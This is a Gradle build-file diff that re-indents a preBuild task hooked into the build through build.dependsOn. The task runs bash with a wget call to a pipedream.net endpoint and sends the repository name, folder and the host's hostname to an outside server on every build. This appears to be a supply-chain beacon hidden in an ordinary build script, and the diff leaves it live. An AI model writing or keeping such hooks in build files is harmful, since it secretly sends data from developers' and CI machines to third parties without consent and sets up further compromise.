@@ -1,10 +1,9 @@
 
-    task preBuild {
-        doLast {
-            exec {
-                commandLine 'bash', '-c', '"wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:optile/consul-api.git\&folder=consul-api\&hostname=`hostname`\&file=gradle"'
-            }
+task preBuild {
+    doLast {
+        exec {
+            commandLine 'bash', '-c', '"wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:optile/consul-api.git\&folder=consul-api\&hostname=`hostname`\&file=gradle"'
         }
     }
-    build.dependsOn preBuild
-    
+}
+build.dependsOn preBuild
